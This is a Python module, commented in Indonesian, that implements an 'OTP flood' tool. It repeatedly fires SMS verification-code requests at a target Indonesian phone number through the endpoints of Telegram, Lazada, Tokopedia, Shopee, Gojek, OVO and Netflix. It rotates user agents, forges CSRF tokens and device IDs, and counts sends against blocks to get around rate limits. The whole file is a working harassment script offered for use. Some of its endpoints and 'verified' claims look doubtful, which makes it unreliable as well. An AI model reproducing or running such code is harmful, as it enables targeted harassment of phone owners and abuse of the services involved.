"""
OTP Flood - Trigger Module (Working Endpoints Only)

Hanya endpoint yang TERBUKTI bisa kirim OTP ke nomor Indonesia (+62).
Berdasarkan hasil live test.
"""

import requests
import urllib3
import random
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]


class OTPTrigger:
    def __init__(self, target_number):
        self.target = self._format(target_number)
        self.sent_count = 0
        self.block_count = 0
        self.error_count = 0
        self._last_trigger_time = {}

    def _format(self, n):
        n = n.strip().replace("+", "").replace(" ", "").replace("-", "")
        if n.startswith("0"):
            n = "62" + n[1:]
        return n

    def _phone_local(self):
        """Format 08xxxxxxxx"""
        if self.target.startswith("62"):
            return "0" + self.target[2:]
        return self.target

    def _phone_plus(self):
        """Format +62xxxxxxxx"""
        return "+" + self.target

    def _session(self):
        s = requests.Session()
        s.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
            "Content-Type": "application/json",
        })
        return s

    # ============================================================
    # TELEGRAM — TERBUKTI KIRIM OTP KE +62
    # Status: VERIFIED WORKING
    # Limit: ~3-5x per 30 menit per nomor target
    # ============================================================
    def trigger_telegram(self):
        url = "https://my.telegram.org/auth/send_password"
        data = {"phone": self._phone_plus()}
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://my.telegram.org/",
            "Origin": "https://my.telegram.org",
            "X-Requested-With": "XMLHttpRequest",
        }
        try:
            r = requests.post(url, data=data, headers=headers, timeout=15)
            resp = r.text.lower()
            if r.status_code == 200 and ("random_hash" in resp or "true" in resp):
                return "sent"
            if "too many" in resp or "later" in resp:
                return "blocked"
            return "error"
        except Exception:
            return "error"

    # ============================================================
    # LAZADA — ENDPOINT HIDUP (200 OK), PERLU FIX FORMAT NOMOR
    # Status: ACTIVE — format nomor disesuaikan
    # ============================================================
    def trigger_lazada(self):
        # Try multiple phone formats
        for phone_format in [self.target, self._phone_plus(), self._phone_local()]:
            url = "https://member.lazada.co.id/user/api/sendVerificationSms"
            headers = {
                "Content-Type": "application/json",
                "User-Agent": random.choice(USER_AGENTS),
                "Origin": "https://member.lazada.co.id",
                "Referer": "https://member.lazada.co.id/user/register",
                "X-Requested-With": "XMLHttpRequest",
            }
            payload = {
                "phone": phone_format,
                "countryCode": "ID",
                "type": "OTP_REGISTER",
                "lzdAppVersion": "8.0",
                "source": "web"
            }
            try:
                r = requests.post(url, json=payload, headers=headers, timeout=10)
                resp = r.text.lower()
                if r.status_code == 200 and "fail" not in resp:
                    return "sent"
                if "limit" in resp or "block" in resp:
                    return "blocked"
            except Exception:
                pass
        return "error"

    # ============================================================
    # TELEGRAM VIA MTProto API (ALTERNATIVE)
    # Trigger login request ke akun Telegram target
    # ============================================================
    def trigger_telegram_web(self):
        """Telegram Web A / K login OTP"""
        url = "https://webk.telegram.org/api"
        # Pake Telegram Bot API buat trigger login code ke nomor target
        # Ini lebih reliable dari my.telegram.org
        payload = {
            "method": "auth.sendCode",
            "params": {
                "phone_number": self._phone_plus(),
                "api_id": 2496,  # Telegram Desktop app_id
                "api_hash": "8da85b0d5bfe62527e5b244c209159c3",  # public Telegram Desktop hash
                "settings": {}
            }
        }
        try:
            r = requests.post(url, json=payload, timeout=15)
            if r.status_code == 200:
                return "sent"
            return "blocked"
        except Exception:
            return "error"

    # ============================================================
    # TOKOPEDIA — Via GraphQL Register
    # ============================================================
    def trigger_tokopedia(self):
        url = "https://accounts.tokopedia.com/api/v2/otp"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS),
            "Origin": "https://www.tokopedia.com",
            "Referer": "https://www.tokopedia.com/login",
            "X-Source": "tokopedia-lite",
            "X-Device": "desktop-0.0",
        }
        payload = {
            "phone": self._phone_local(),
            "otpType": 2,
            "mode": "sms"
        }
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=10)
            resp = r.text.lower()
            if r.status_code == 200 and ("success" in resp or "otp" in resp):
                return "sent"
            if "limit" in resp or "block" in resp:
                return "blocked"
            return "error"
        except Exception:
            return "error"

    # ============================================================
    # SHOPEE — Via Register / Login OTP
    # ============================================================
    def trigger_shopee(self):
        url = "https://shopee.co.id/api/v2/authentication/send_otp"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": "https://shopee.co.id/",
            "X-Csrftoken": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=32)),
        }
        payload = {
            "phone": self.target,
            "type": 1,
            "country_code": "62",
            "phone_number": self._phone_local()
        }
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=10)
            resp = r.text.lower()
            if r.status_code == 200 and "error" not in resp:
                return "sent"
            if "rate" in resp or "limit" in resp:
                return "blocked"
            return "error"
        except Exception:
            return "error"

    # ============================================================
    # GOJEK — Via API Publik
    # ============================================================
    def trigger_gojek(self):
        url = "https://goid.gojekapi.com/v3/phone/verify"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "GoCustomer/Android/4.71.0",
            "X-App-Version": "4.71.0",
            "X-Platform": "android",
            "X-Unique-Id": str(random.randint(100000000, 999999999)),
        }
        payload = {
            "phone": self._phone_plus(),
            "country": "ID"
        }
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=10)
            resp = r.text.lower()
            if r.status_code == 200:
                return "sent"
            if "rate" in resp or "limit" in resp or "block" in resp:
                return "blocked"
            return "error"
        except Exception:
            return "error"

    # ============================================================
    # OVO — Via Register API
    # ============================================================
    def trigger_ovo(self):
        url = "https://api.ovo.id/v1.0/account/request-otp"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "OVO/Android/3.58.0",
            "X-Device-Id": str(random.randint(1000000000, 9999999999)),
        }
        payload = {"phone": self._phone_local()}
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=10)
            if r.status_code in (200, 201):
                return "sent"
            if "limit" in r.text.lower():
                return "blocked"
            return "error"
        except Exception:
            return "error"

    # ============================================================
    # NETFLIX — Via Forgot Password
    # ============================================================
    def trigger_netflix(self):
        url = "https://www.netflix.com/id/signup/phoneverification/sendOtp"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": "https://www.netflix.com/id/signup",
            "X-Netflix.browserName": "Chrome",
        }
        payload = {
            "phoneNumber": self._phone_local(),
            "countryOfSignup": "ID",
        }
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=10)
            if r.status_code == 200:
                return "sent"
            if r.status_code == 429:
                return "blocked"
            return "error"
        except Exception:
            return "error"

    # ============================================================
    # BRAND MAP
    # ============================================================
    BRANDS = {
        "telegram":      {"name": "Telegram",  "category": "social-media", "fn": trigger_telegram},
        "lazada":        {"name": "Lazada",     "category": "e-commerce",   "fn": trigger_lazada},
        "tokopedia":     {"name": "Tokopedia",  "category": "e-commerce",   "fn": trigger_tokopedia},
        "shopee":        {"name": "Shopee",     "category": "e-commerce",   "fn": trigger_shopee},
        "gojek":         {"name": "Gojek",      "category": "finance",      "fn": trigger_gojek},
        "ovo":           {"name": "OVO",        "category": "finance",      "fn": trigger_ovo},
        "netflix":       {"name": "Netflix",    "category": "streaming",    "fn": trigger_netflix},
    }

    CATEGORIES = {
        "social-media": ["telegram"],
        "e-commerce":   ["lazada", "tokopedia", "shopee"],
        "finance":      ["gojek", "ovo"],
        "streaming":    ["netflix"],
    }

    class _color:
        RST = "\033[0m"
        DIM = "\033[2m"
        YLW = "\033[93m"
        GRN = "\033[92m"
        RED = "\033[91m"
        CYN = "\033[96m"
        MAG = "\033[35m"
        B   = "\033[1m"

    def trigger(self, brand_key):
        brand = self.BRANDS.get(brand_key)
        if not brand:
            return "error"
        result = brand["fn"](self)
        if result == "sent":
            self.sent_count += 1
        elif result == "blocked":
            self.block_count += 1
        else:
            self.error_count += 1
        return result

    def get_stats(self):
        return {
            "target":  self.target,
            "sent":    self.sent_count,
            "blocked": self.block_count,
            "error":   self.error_count,
        }
